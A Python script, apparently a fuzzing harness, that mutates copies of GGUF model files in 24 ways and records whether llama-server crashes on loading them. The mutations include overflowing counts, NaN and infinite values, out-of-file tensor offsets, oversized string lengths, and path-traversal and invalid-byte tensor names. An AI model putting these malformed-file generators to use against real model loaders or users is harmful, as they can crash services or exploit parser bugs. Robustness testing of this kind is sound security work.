#!/usr/bin/env python3
"""GGUF attack: 24 attacks x 4 models. cp->mmap patch->--check-tensors->log->rm."""

import csv, os, signal, struct, subprocess, sys, time, mmap, shutil
from pathlib import Path

REPO = Path(__file__).resolve().parents[1]
SERVER = REPO / "llama-monitor/build/llama.cpp/bin/llama-server"
CDIR = REPO / "logs/ultimate"
MDIR = CDIR / "models"
CSV = CDIR / "results.csv"
PORT = 19999
TIMEOUT = 30

def pref(k):
    if isinstance(k, str): k = k.encode()
    return struct.pack("<Q", len(k)) + k  # key_len is uint64 in GGUF

def meta(path, key):
    with open(path, "rb") as f:
        d = f.read(50 << 20)
    p = pref(key)
    i = d.find(p)
    if i < 0: return None
    t = struct.unpack_from("<I", d, i + len(p))[0]
    return t, d, i + len(p) + 4

def mpatch(path, key, fmt, val):
    r = meta(path, key)
    if r is None: return False
    _, _, vo = r
    with open(path, "r+b") as f:
        with mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_WRITE) as m:
            struct.pack_into(fmt, m, vo, val)
    return True

def get_arch(path):
    r = meta(path, "general.architecture")
    if r is None: return "unknown"
    t, d, vo = r
    if t != 8: return "unknown"
    sl = struct.unpack_from("<Q", d, vo)[0]
    return d[vo+8:vo+8+sl].decode(errors="replace")

def tquant(path, sub, qt, n=5):
    with open(path, "r+b") as f:
        with mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_WRITE) as m:
            c, p = 0, 0
            while c < n:
                p = m.find(sub, p)
                if p < 0: break
                if p >= 8:
                    tl = struct.unpack_from("<Q", m, p-8)[0]
                    if 0 < tl < 200:
                        cur = p + tl
                        nd = struct.unpack_from("<I", m, cur)[0]
                        if nd <= 5:
                            cur += 4 + nd * 8
                            struct.pack_into("<I", m, cur, qt)
                            c += 1
                p += 1
            return c

def toffset(path, sub, val, n=5):
    with open(path, "r+b") as f:
        with mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_WRITE) as m:
            c, p = 0, 0
            while c < n:
                p = m.find(sub, p)
                if p < 0: break
                if p >= 8:
                    tl = struct.unpack_from("<Q", m, p-8)[0]
                    if 0 < tl < 200:
                        cur = p + tl
                        nd = struct.unpack_from("<I", m, cur)[0]
                        if nd <= 5:
                            cur += 4 + nd * 8 + 4
                            struct.pack_into("<Q", m, cur, val)
                            c += 1
                p += 1
            return c

def check(path):
    cmd = [str(SERVER), "--check-tensors", "-m", str(path), "--port", str(PORT), "--host", "127.0.0.1"]
    t0 = time.time()
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        while time.time() - t0 < TIMEOUT:
            time.sleep(0.5)
            if proc.poll() is not None:
                break
        e = time.time() - t0
        if proc.poll() is None:
            # Still running = model loaded OK, server waiting. Kill it.
            proc.kill()
            proc.wait()
            stderr = proc.stderr.read()
            return {"rc": 0, "signal": "OK", "crashed": False, "elapsed": round(e, 1),
                    "error": "loaded_ok"}
        # Process exited on its own (model load failure or crash)
        stderr = proc.stderr.read()
        rc = proc.returncode
        s = rc - 256 if rc > 128 else rc
        sn = signal.Signals(-s).name if s < 0 else f"exit({rc})"
        err = [l for l in stderr.split("\n") if "error" in l.lower() or "SIGABRT" in l
               or "assert" in l.lower() or "segfault" in l.lower() or "SIGSEGV" in l]
        return {"rc": rc, "signal": sn, "crashed": s < 0, "elapsed": round(e, 1),
                "error": "; ".join(err)[:250] if err else stderr[-120:].strip()[:120]}
    except Exception as ex:
        return {"rc": -999, "signal": "ERR", "crashed": False, "elapsed": 0, "error": str(ex)[:120]}

# ---- Attacks ----
ATKS = []

def reg(f):
    ATKS.append(f)
    return f

@reg
def rope_drift(vp, a):
    d = {}
    for k in [f"{a}.rope.dimension_count", f"{a}.rope.dim"]:
        if mpatch(vp, k, "<I", 0x7FFFFFFF): d[k.rsplit('.',1)[1]] = "0x7FFFFFFF"
    if mpatch(vp, f"{a}.context_length", "<I", 0xFFFFFFFF): d["ctx"] = "0xFFFFFFFF"
    return d

@reg
def block_mismatch(vp, a):
    d = {}
    for k in [f"{a}.block_count", f"{a}.n_layer"]:
        if mpatch(vp, k, "<I", 1): d["block"] = "1"
    return d

@reg
def embed_crush(vp, a):
    d = {}
    if mpatch(vp, f"{a}.embedding_length", "<I", 1): d["embd"] = "1"
    if mpatch(vp, f"{a}.attention.head_count", "<I", 0xFFFFFFFF): d["head"] = "0xFFFFFFFF"
    if mpatch(vp, f"{a}.attention.head_count_kv", "<I", 0): d["head_kv"] = "0"
    return d

@reg
def token_boundary(vp, a):
    d = {}
    for k, v in [("bos_token_id", 0xFFFFFFFF), ("eos_token_id", 0xFFFFFFFE),
                 ("padding_token_id", 0x80000000), ("unknown_token_id", 0x7FFFFFFF)]:
        if mpatch(vp, f"tokenizer.ggml.{k}", "<I", v): d[k] = f"0x{v:X}"
    return d

@reg
def quant_swap(vp, a):
    n = tquant(vp, b"blk", 8)
    return {"patched": n}

@reg
def tensor_offset(vp, a):
    n = toffset(vp, b"blk", 0x40000000, 1)
    return {"patched": n}

@reg
def arch_spoof(vp, a):
    r = meta(vp, "general.architecture")
    if r is None: return {}
    t, d, vo = r
    if t != 8: return {}
    sl = struct.unpack_from("<Q", d, vo)[0]
    spoof = {"gemma4": "llama", "nemotron_h": "llama", "phi3": "gemma2", "qwen35": "llama", "llama": "phi3"}
    na = spoof.get(a, "llama")
    nb = na.encode()[:sl].ljust(sl, b"\x00")
    with open(vp, "r+b") as f:
        with mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_WRITE) as m:
            for i, bv in enumerate(nb): m[vo+8+i] = bv
    return {"from": a, "to": na}

@reg
def vocab_corrupt(vp, a):
    with open(vp, "r+b") as f:
        with mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_WRITE) as m:
            kp = pref(b"tokenizer.ggml.tokens")
            i = m.find(kp)
            if i < 0: return {"note": "not_found"}
            i += len(kp)
            vt = struct.unpack_from("<I", m, i)[0]; i += 4
            if vt != 9: return {"note": f"type={vt}"}
            _et = struct.unpack_from("<I", m, i)[0]; i += 4
            ne = struct.unpack_from("<Q", m, i)[0]; i += 8
            n = 0
            for _ in range(min(ne, 20)):
                if i+8 > len(m): break
                sl = struct.unpack_from("<Q", m, i)[0]
                struct.pack_into("<Q", m, i, 0x7FFFFFFFFFFFFFFF)
                n += 1
                i += 8 + min(sl, 1000)
            return {"corrupted": n}

@reg
def unicode_names(vp, a):
    payloads = [b"\xc0\xaf.", b"\xed\xa0\x80.", b"\x00.", b"../"*5+b".", b"\xef\xbb\xbf."]
    with open(vp, "r+b") as f:
        with mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_WRITE) as m:
            for p in payloads:
                i = m.find(b"blk.0")
                if i < 0: continue
                tl = struct.unpack_from("<I", m, i-4)[0]
                if tl <= 0 or tl > 200: continue
                for j in range(min(len(p), tl)): m[i+j] = p[j]
    return {"patched": len(payloads)}

@reg
def version_spoof(vp, a):
    with open(vp, "r+b") as f:
        with mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_WRITE) as m:
            struct.pack_into("<I", m, 4, 0xFFFFFFFF)
    return {}

@reg
def alignment_zero(vp, a):
    d = {}
    for k in ["general.alignment", "alignment"]:
        if mpatch(vp, k, "<Q", 0): d[k] = "0"
    return d

@reg
def payload_bomb(vp, a):
    fs = os.path.getsize(vp)
    off = fs + 0x40000000
    n = toffset(vp, b"blk.0", off, 1)
    if n == 0: n = toffset(vp, b"output.weight", off, 1)
    return {"offset": hex(off), "filesize": fs, "patched": n}

@reg
def nan_inf_meta(vp, a):
    d = {}
    for k in [f"{a}.rope.freq_base", "general.temperature", f"{a}.attention.sliding_window"]:
        if mpatch(vp, k, "<f", float("nan")): d[k.rsplit('.',1)[1]] = "NaN"
    return d

@reg
def overflow_counts(vp, a):
    d = {}
    for k, v in [(f"{a}.embedding_length", 0), (f"{a}.attention.head_count", 0),
                 (f"{a}.attention.head_count_kv", 0), (f"{a}.block_count", 0)]:
        if mpatch(vp, k, "<I", v): d[k.rsplit('.',1)[1]] = "0"
    return d

@reg
def rope_freq_zero(vp, a):
    d = {}
    if mpatch(vp, f"{a}.rope.freq_base", "<f", 0.0): d["freq_base"] = "0.0"
    return d

@reg
def vocab_size_zero(vp, a):
    d = {}
    if mpatch(vp, f"{a}.vocab_size", "<I", 0): d["vocab"] = "0"
    return d

@reg
def quant_255(vp, a):
    n = tquant(vp, b"blk", 255)
    if n == 0: n = tquant(vp, b"output.weight", 255)
    return {"patched": n}

@reg
def bos_eos_loop(vp, a):
    d = {}
    if mpatch(vp, "tokenizer.ggml.bos_token_id", "<I", 1): d["bos"] = "1"
    if mpatch(vp, "tokenizer.ggml.eos_token_id", "<I", 1): d["eos"] = "1"
    return d

@reg
def string_len_overflow(vp, a):
    with open(vp, "rb") as f:
        d = f.read(50 << 20)
    if d[:4] != b"GGUF": return {}
    pos = 24  # skip header: magic(4) + version(4) + tensor_count(8) + kv_count(8)
    kvc = struct.unpack_from("<Q", d, 16)[0]  # kv_count is uint64
    for _ in range(min(kvc, 50)):
        if pos+8 > len(d): break
        kl = struct.unpack_from("<Q", d, pos)[0]  # key_len is uint64
        pos += 8 + kl
        if pos+4 > len(d): break
        vt = struct.unpack_from("<I", d, pos)[0]; pos += 4
        if vt == 8:
            with open(vp, "r+b") as f:
                with mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_WRITE) as m:
                    struct.pack_into("<Q", m, pos, 0x7FFFFFFFFFFFFFFF)
            return {"patched": "first_string"}
        elif vt == 4: pos += 4
        elif vt == 6: pos += 4
        elif vt == 7: pos += 1
        elif vt == 10: pos += 8
        elif vt == 11: pos += 8
        elif vt == 9:
            et = struct.unpack_from("<I", d, pos)[0]; n = struct.unpack_from("<Q", d, pos+4)[0]
            pos += 12
            for _ in range(min(n, 10)):
                if et == 8: sl = struct.unpack_from("<Q", d, pos)[0]; pos += 8 + min(sl, 1000)
                elif et == 4: pos += 4
                else: break
        elif vt in (0,1,2): pass
        else: break
    return {"note": "no_string"}

@reg
def negative_head_kv(vp, a):
    d = {}
    if mpatch(vp, f"{a}.attention.head_count_kv", "<I", 0x80000000): d["head_kv"] = "INT_MIN"
    return d

@reg
def logit_scale_inf(vp, a):
    d = {}
    for k in [f"{a}.logit_scale", "general.logit_scale"]:
        if mpatch(vp, k, "<f", float("inf")): d[k] = "inf"
    return d

@reg
def embd_max(vp, a):
    d = {}
    if mpatch(vp, f"{a}.embedding_length", "<I", 0xFFFFFFFF): d["embd"] = "0xFFFFFFFF"
    return d

@reg
def head_zero(vp, a):
    d = {}
    if mpatch(vp, f"{a}.attention.head_count", "<I", 0): d["head"] = "0"
    if mpatch(vp, f"{a}.attention.head_count_kv", "<I", 0): d["head_kv"] = "0"
    return d

@reg
def self_ref(vp, a):
    n = 0
    with open(vp, "r+b") as f:
        with mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_WRITE) as m:
            i = m.find(b"blk.0")
            if i >= 0 and i >= 4:
                tl = struct.unpack_from("<I", m, i-4)[0]
                if 0 < tl < 200:
                    cur = i + tl; nd = struct.unpack_from("<I", m, cur)[0]
                    if nd <= 5: cur += 4 + nd*8 + 4; struct.pack_into("<Q", m, cur, 0x40); n = 1
    return {"patched": n}

# ---- Main ----
MODELS = {"nemotron": MDIR/"nemotron.gguf", "gemma4": MDIR/"gemma4.gguf",
          "qwen35": MDIR/"qwen35.gguf", "phi4": MDIR/"phi4.gguf"}
FIELDS = ["model","arch","size_mb","attack","rc","signal","crashed","elapsed","details","error"]

def save(rows):
    with open(CSV, "w", newline="") as f:
        w = csv.DictWriter(f, fieldnames=FIELDS)
        w.writeheader()
        for r in rows:
            w.writerow({k: r.get(k, "") for k in FIELDS})

def main():
    import argparse
    ap = argparse.ArgumentParser()
    ap.add_argument("--models", nargs="+", default=list(MODELS.keys()))
    ap.add_argument("--attack", nargs="+", default=[a.__name__ for a in ATKS])
    args = ap.parse_args()
    CDIR.mkdir(parents=True, exist_ok=True)
    with open(CSV, "w", newline="") as f:
        csv.DictWriter(f, fieldnames=FIELDS).writeheader()
    rows = []

    for mn in args.models:
        mp = MODELS.get(mn)
        if not mp or not mp.exists():
            print(f"[SKIP] {mn}", file=sys.stderr); continue
        arch = get_arch(str(mp))
        sz = mp.stat().st_size >> 20
        print(f"\n{'='*60}\n  {mn} arch={arch} {sz}MB\n{'='*60}", flush=True)

        base = CDIR / f"_{mn}_base.gguf"
        t0 = time.time()
        shutil.copy2(str(mp), str(base))
        print(f"  Base: {time.time()-t0:.0f}s", flush=True)

        for fn in ATKS:
            aname = fn.__name__
            if aname not in args.attack: continue

            vp = CDIR / f"{mn}_{aname}.gguf"
            t0 = time.time()
            shutil.copy2(str(base), str(vp))
            ct = time.time() - t0

            try:
                det = fn(vp, arch)
            except Exception as ex:
                print(f"  [{aname:25s}] GENERR: {ex}", flush=True)
                try: vp.unlink()
                except: pass
                rows.append({"model":mn,"arch":arch,"size_mb":sz,"attack":aname,
                    "rc":-999,"signal":"GENERR","crashed":False,"elapsed":0,"details":"","error":str(ex)[:200]})
                save(rows); time.sleep(1); continue

            res = check(vp)
            res.update({"model":mn,"arch":arch,"size_mb":sz,"attack":aname,
                        "details":";".join(f"{k}={v}" for k,v in det.items())})
            rows.append(res)

            tag = "CRASH" if res["crashed"] else (f"rc={res['rc']}" if res["rc"] else "OK")
            if res["signal"] == "TIMEOUT": tag = "TIMEOUT"
            print(f"  [{aname:25s}] {tag:12s} {res['elapsed']}s [{ct:.1f}s] {res.get('error','')[:60]}", flush=True)

            try: vp.unlink()
            except: pass
            save(rows)
            time.sleep(1)

        try: base.unlink()
        except: pass

    crashes = [r for r in rows if r.get("crashed")]
    oks = [r for r in rows if r.get("rc") == 0]
    tos = [r for r in rows if r.get("signal") == "TIMEOUT"]
    print(f"\n{'='*60}\nTOTAL={len(rows)} OK={len(oks)} CRASH={len(crashes)} TO={len(tos)}", flush=True)
    for r in crashes: print(f"  CRASH: {r['model']}/{r['attack']} sig={r['signal']}", flush=True)
    for r in oks: print(f"  OK:    {r['model']}/{r['attack']}", flush=True)
    for r in tos: print(f"  TO:    {r['model']}/{r['attack']}", flush=True)
    return 0

if __name__ == "__main__":
    raise SystemExit(main())
